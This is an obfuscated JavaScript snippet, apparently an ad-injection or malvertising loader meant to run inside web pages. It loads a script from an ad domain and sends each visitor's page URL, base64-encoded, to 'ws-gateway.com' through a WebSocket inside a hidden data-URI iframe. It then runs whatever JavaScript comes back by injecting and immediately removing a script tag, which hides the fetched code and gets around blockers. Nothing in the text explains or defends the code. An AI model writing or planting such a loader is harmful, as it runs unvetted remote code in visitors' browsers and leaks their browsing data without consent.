(function() {
    var a = '//pleaseletmeadvertise.com/path/ads/ads.js';
    var b = 'ws-gateway.com';
    var c = {
        route: 'get_js_ws',
        stid: '13780',
        sbid: '1',
        version: '4',
        page_url: document.location.href
    };
    var d = function(a, b) {
            var c, d, e;
            d = false;
            c = document.createElement('script');
            c.type = 'text/javascript';
            c.src = a;
            c.onload = c.onreadystatechange = function() {
                if (!d && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete')) {
                    d = true;
                    if (b) {
                        document.head.removeChild(c);
                        b()
                    }
                }
            }
            ;
            c.onerror = function() {
                document.head.removeChild(c);
                b()
            }
            ;
            document.head.appendChild(c)
        }
        ;
    var e = function(a) {
            var b = JSON.stringify(a);
            var c = window.btoa(b);
            c = f() + c + f();
            c = c.replace(/\//g, '-');
            return c
        }
        ;
    var f = function() {
            var a = '';
            var b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for (var c = 0; c < 5; c++)
                a += b.charAt(Math.floor(Math.random() * b.length));
            return a
        }
        ;
    debugger
    var g = function(a, c) {
            var d = new Date().getTime() + f();
            var e = '';
            if (window.location.protocol == 'https:')
                e = 'wss://' + b;
            else
                e = 'ws://' + b;
            var g = document.createElement('iframe');
            g.setAttribute('src', 'data:text/html;charset=utf-8,%3Chtml%3E%3Cbody%3E<script>var ws=new WebSocket("' + e + '");ws.onopen=function(){ws.send("' + a + '");};ws.onmessage=function(msg){window.top.postMessage("' + d + '~" + msg.data,"' + window.location.href + '");ws.close();}</script>%3C/body%3E%3C/html%3E');
            g.setAttribute('style', 'height: 0px !important; width: 0px !important; display: none !important;');
            document.body.appendChild(g);
            function h(a) {
                var b = a.data.split('~')[0];
                var e = a.data.split('~')[1];
                if (b == undefined || e == undefined || b != d)
                    return;
                window.removeEventListener('message', h);
                c(e);
                document.body.removeChild(g)
            }
            window.addEventListener('message', h, false)
        }
        ;
    var h = function(a, b) {
            return Math.floor(Math.random() * (b - a + 1)) + a
        }
        ;
    var i = function(a) {
            var b = '';
            var c = 'abcdefghijklmnopqrstuvwxyz';
            for (var d = 0; d < a; d++)
                b += c.charAt(Math.floor(Math.random() * c.length));
            return b
        }
        ;
    var j = function() {
            var a = e(c);
            g(a, function(a) {
                var b = document.createElement('script');
                b.type = 'text/javascript';
                b.innerHTML = a;
                document.head.appendChild(b);
                document.head.removeChild(b)
            })
        }
        ;
debugger
    d(a, function() {
        if (window._impspcabe_alpha == false)
            d(window._impspcabe_path, function() {
                if (window._impspcabe_beta == false)
                    return;
                else
                    j()
            });
        else
            j()
    });
})();